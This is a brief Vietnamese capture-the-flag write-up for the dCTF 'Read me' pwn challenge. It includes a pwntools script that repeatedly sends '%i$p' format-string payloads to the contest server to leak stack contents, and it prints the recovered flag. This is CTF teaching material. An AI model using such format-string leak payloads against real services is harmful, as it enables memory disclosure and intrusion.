![readme](C:\Users\vietd\OneDrive - actvn.edu.vn\MyWriteUp\VietAT16-Task_KCSC\dCTF\pwn\Read me\imgs\readme.png)

Đây là 1 bài format string

![printaddr](C:\Users\vietd\OneDrive - actvn.edu.vn\MyWriteUp\VietAT16-Task_KCSC\dCTF\pwn\Read me\imgs\printaddr.png)

```python
# xpl.py
from pwn import *

data_lst = []
for i in range(1, 15):
	r = remote('dctf-chall-readme.westeurope.azurecontainer.io', 7481)
	r.sendline(f'%{i}$p')
	r.recvuntil("hello ")
	data_leak = r.recvline()[:-1]
	if(data_leak != b'(nil)'):
		data_lst.append(data_leak.decode())
for hexchar in data_lst:
	print(p64(int(hexchar, 16)))
```

Mình sẽ chạy nhiểu lần để leak dần từ stack. Cách này hiêu quả vs những bài giới hạn kí tự nhập vào. Ở đây mình chạy 14 lần là đc flag r![flag](C:\Users\vietd\OneDrive - actvn.edu.vn\MyWriteUp\VietAT16-Task_KCSC\dCTF\pwn\Read me\imgs\flag.png)

flag: `dctf{now_g0_r3ad_s0me_b00k5}`

